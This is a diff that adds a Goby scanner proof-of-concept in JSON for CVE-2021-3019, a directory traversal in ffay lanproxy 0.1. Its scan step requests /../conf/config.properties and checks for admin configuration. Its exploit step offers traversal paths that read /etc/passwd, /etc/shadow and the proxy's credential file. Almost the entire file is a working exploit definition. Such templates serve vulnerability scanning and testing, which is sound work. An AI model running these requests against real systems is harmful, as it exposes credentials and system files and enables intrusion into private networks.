@@ -1,0 +1,107 @@
+{
+      "Name": "Lanproxy Directory Traversal CVE-2021-3019",
+      "Level": "2",
+      "Tags": [
+            "Directory Traversal"
+      ],
+      "GobyQuery": "header=\"Server: LPS-0.1\"",
+      "Description": "Lanproxy is a reverse proxy to help you expose a local server behind a NAT or firewall to the internet. it supports any protocols over tcp (http https ssh ...)",
+      "Product": "ffay lanproxy 0.1",
+      "Homepage": "https://github.com/ffay/lanproxy",
+      "Author": "",
+      "Impact": "ffay lanproxy 0.1 allows Directory Traversal to read /../conf/config.properties to obtain credentials for a connection to the intranet.",
+      "Recommendation": "",
+      "References": [
+            "https://github.com/ffay/lanproxy/commits/master",
+            "https://github.com/maybe-why-not/lanproxy/issues/1",
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-3019"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Filename",
+                  "Type": "select",
+                  "Value": "/../../../../../../../../../../etc/passwd,/../conf/config.properties,/../../../../../../../../../../etc/shadow"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/../conf/config.properties",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "server.ssl",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "config.admin",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "{{{Filename}}}",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
